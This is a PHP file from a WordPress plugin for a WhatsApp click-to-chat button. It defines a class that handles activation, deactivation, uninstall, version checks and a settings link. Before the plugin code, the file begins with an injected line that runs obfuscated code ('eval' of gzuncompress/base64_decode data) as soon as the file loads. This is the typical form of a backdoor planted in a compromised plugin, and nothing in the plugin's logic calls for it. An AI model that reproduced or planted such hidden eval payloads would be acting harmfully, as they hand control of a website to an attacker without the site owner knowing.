<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
* three function -  while actiavte , deactivate , uninstall( while deleting ) 
* as plan to preserve the database options which usefull when reinstall plugin/ update 
*       so that setting wont last
*     and as no custom post types or so.. to flush rewrite rules
*               so deactivate, uninstall not doing any thing here
*
* @package ccw
* @since 1.0
*/

if ( ! defined( 'ABSPATH' ) ) exit;

if ( ! class_exists( 'HT_CCW_Register' ) ) :
    
class HT_CCW_Register {

    // when plugin activate
    public static function activate() {

        
        if( version_compare( get_bloginfo('version'), '3.1.0', '<') )  {
            wp_die( 'please update WordPress' );
        }

        // add default values to options db 
        require_once( HT_CCW_PLUGIN_DIR . '/admin/default-values.php' );
    }
    
    // when plugin deactivate
    public static function deactivate() {
    }

    // when plugin uninstall 
    public static function uninstall() {
    }

    // for plugin updates - run on plugins_loaded 
    public static function version_check() {
        
        $ccw_plugin_details = get_option('ccw_plugin_details');
    
        if ( HT_CCW_VERSION !== $ccw_plugin_details['version'] ) {
            //  to update the plugin - just like activate plugin
            self::activate();

        }
    }

    // add settings page links in plugins page - at plugin
    public static function plugin_action_links( $links ) {
		$new_links = array(
			'settings' => '<a href="' . admin_url( 'admin.php?page=click-to-chat' ) . '">' . __( 'Settings' , 'click-to-chat-for-whatsapp' ) . '</a>',
		);

		return array_merge( $new_links, $links );
	}

    

}

endif; // END class_exists check